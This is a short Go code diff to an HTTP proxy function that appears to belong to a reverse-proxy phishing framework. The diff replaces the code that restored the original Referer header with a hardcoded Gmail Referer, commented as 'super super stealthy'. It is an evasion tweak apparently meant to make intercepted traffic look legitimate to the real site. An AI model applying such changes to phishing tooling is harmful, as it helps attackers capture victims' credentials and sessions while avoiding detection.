@@ -582,16 +582,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// fix referer
-				referer := req.Header.Get("Referer")
-				if referer != "" {
-					if o_url, err := url.Parse(referer); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Referer", o_url.String())
-						}
-					}
-				}
+                
+                //super super stealthy header
+			    req.Header.Set("Referer", "https://mail.google.com/")
+                
+
 
 				// patch GET query params with original domains
 				if pl != nil {
